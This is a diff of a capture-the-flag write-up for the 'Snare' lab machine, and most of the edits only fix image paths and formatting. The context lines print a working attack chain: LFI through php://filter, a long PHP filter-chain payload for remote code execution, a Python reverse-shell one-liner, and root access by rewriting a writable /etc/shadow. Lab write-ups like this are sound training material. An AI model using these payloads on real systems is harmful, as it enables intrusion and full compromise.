@@ -12,12 +12,12 @@ title: Snare PwnTillDawn
 
 ### Description:
 Snare is an easy-rated machine on PwnTillDawn. The initial foothold is achieved through a Local File Inclusion (LFI) vulnerability, which is later escalated to Remote Code Execution (RCE) using a PHP filter chain attack.
-![Snare Overview](images/articles/snare/snare.png)
+![Snare Overview](/images/articles/snare/snare.png)
 
 ## Reconnaissance:
 
 I started with standard network reconnaissance using **nmap**: `nmap <ip> -p- -A -T 4 -vv`
-![image](images/articles/snare/nmap.png)
+![image](/images/articles/snare/nmap.png)
 
 We have two ports open `22(SSH) and 80(HTTP)`
 
@@ -31,7 +31,7 @@ includes [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 554ms]
 With this information, I manually explored the web application. Accessing `<ip>/index.php?page=home` indicated a **potential LFI** via the page parameter.
 
 Exploring /includes, I found several PHP files 
-![image](images/articles/snare/includes.png)
+![image](/images/articles/snare/includes.png)
 
 Then back to `<ip>/index.php?page=home` changed the page parameter value to `includes/a_config` go nothing then I try to use `php://filter` wrapper like this `php://filter/convert.base64-encode/resource=includes/a_config` then boom I have the base64 encoded value of a_config.php file
 ```
@@ -140,24 +140,24 @@ Send the following part has the page parameter value
  ```
 php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=id
 ```
-![image](images/articles/snare/rce.png)
+![image](/images/articles/snare/rce.png)
 
 Boom RCE confirm, replace `id` in the above with the below and run `nc-lvpn 4000` on my machine then got a reverse shell 
 ```
 python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<ip>",4000));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
 ```
-![image](images/articles/snare/rev_shell.png)
-![image](images/articles/snare/rev2_shell.png)
+![image](/images/articles/snare/rev_shell.png)
+![image](/images/articles/snare/rev2_shell.png)
 
 * * *
 
 ### Privilege Esclation
 
-I noticed I have write permission to /etc/shadow file: `-rwxrwxrwx 1 root shadow 1129 Nov 20  2020 /etc/shadow` 
+I noticed I have write permission to `/etc/shadow` file: `-rwxrwxrwx 1 root shadow 1129 Nov 20  2020 /etc/shadow` 
 Then I generate a new hash password for root user using `openssl passwd <any passwd>` then I downlaod the /etc/shadow file to my linux machine, edited the hashed root passwd to the generated hash then send it back to the remote machine. After this I run su root then enter the password I used in `openssl passwd <any passwd>` and boom I gain root shell
-![Hash edit](images/articles/snare/hash_edit.png)
-![Root shell](images/articles/snare/root.png)
-Lesson: Writable /etc/shadow is a critical misconfiguration and allows complete system compromise.
+![Hash edit](/images/articles/snare/hash_edit.png)
+![Root shell](/images/articles/snare/root.png)
+Lesson: Writable `/etc/shadow` is a critical misconfiguration and allows complete system compromise.
 
 ### Key Takeaways
 * Never pass unsanitized user input into include() or require().
